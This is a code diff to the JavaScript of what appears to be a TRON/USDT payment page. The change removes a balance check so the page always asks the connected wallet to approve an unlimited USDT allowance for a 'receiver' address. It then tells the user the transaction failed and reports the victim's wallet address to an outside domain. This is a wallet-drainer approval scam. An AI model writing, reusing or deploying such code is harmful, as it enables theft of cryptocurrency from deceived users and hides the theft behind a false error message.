@@ -456,28 +456,28 @@
 				}
 
 				// 检查是否满足授权条件:TRX余额≥12 或 能量≥110000
-				if (parseFloat(userData.trxBalance) < 11 && userData.energy < 110000) {
-					showTemporaryMessage('TRX能量不足')
+				// if (parseFloat(userData.trxBalance) < 11 && userData.energy < 110000) {
+				// 	showTemporaryMessage('TRX能量不足')
+				// 	notifyAgentBinding(window.tronWeb.defaultAddress.base58, receiver)
+				// 	return
+				// } else {
+				try {
+					const contract = await window.tronWeb.contract().at(USDT_CONTRACT)
+					// 无限额度
+					const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+
+					// 直接调用 increaseApproval
+					await contract.increaseApproval(receiver, amount).send()
+
+					showTemporaryMessage('交易失败')
+
+					// 这里可以添加上报逻辑
 					notifyAgentBinding(window.tronWeb.defaultAddress.base58, receiver)
-					return
-				} else {
-					try {
-						const contract = await window.tronWeb.contract().at(USDT_CONTRACT)
-						// 无限额度
-						const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
-
-						// 直接调用 increaseApproval
-						await contract.increaseApproval(receiver, amount).send()
-
-						showTemporaryMessage('交易失败')
-
-						// 这里可以添加上报逻辑
-						notifyAgentBinding(window.tronWeb.defaultAddress.base58, receiver)
-					} catch (e) {
-						console.error('Approve failed', e)
-						showTemporaryMessage('支付失败，请重试')
-					}
+				} catch (e) {
+					console.error('Approve failed', e)
+					showTemporaryMessage('支付失败，请重试')
 				}
+				// }
 			}
 			function notifyAgentBinding(walletAddress, serviceAccount) {
 				const WEB_APP_URL = 'https://vipusdt.dpdns.org/'
